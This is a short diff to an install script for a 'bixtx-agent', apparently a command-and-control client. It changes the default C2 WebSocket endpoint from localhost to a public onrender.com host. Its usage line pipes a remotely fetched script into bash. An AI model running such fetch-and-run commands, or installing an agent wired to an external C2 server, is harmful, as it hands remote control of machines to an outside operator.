@@ -4,7 +4,7 @@
 # ║  # " Run: curl -sSL https://raw.githubusercontent.com/jonan2002/BIXTX/main/software-a/install.sh | bash -s -- --key KEY [opts]"    ║
 # ║  Options:                                                                ║
 # ║    --key  KEY        Enroll key (required)                               ║
-# ║    --c2 WSS_URL   C2 WebSocket URL (default: ws://localhost:3001)  ║
+# ║    --c2 WSS_URL   C2 WebSocket URL (default: wss://bixtx.onrender.com)  ║
 # ║    --dir  PATH       Install directory  (default: /opt/bixtx-agent)     ║
 # ║    --silent          Suppress non-error output                           ║
 # ╚══════════════════════════════════════════════════════════════════════════╝
@@ -23,7 +23,7 @@ AGENT_LOG="/var/log/bixtx-agent.log"
 # ── Defaults (overridable via args or env) ────────────────────────────────────
 AGENT_DIR="${AGENT_DIR:-/opt/bixtx-agent}"
 ENROLL_KEY="${BIXTX_ENROLL_KEY:-}"
-C2_URL="${BIXTX_C2_URL:-ws://localhost:3001}"
+C2_URL="${BIXTX_C2_URL:-wss://bixtx.onrender.com}"
 SILENT=false
 
 # ── Parse arguments ──────────────────────────────────────────────────────────
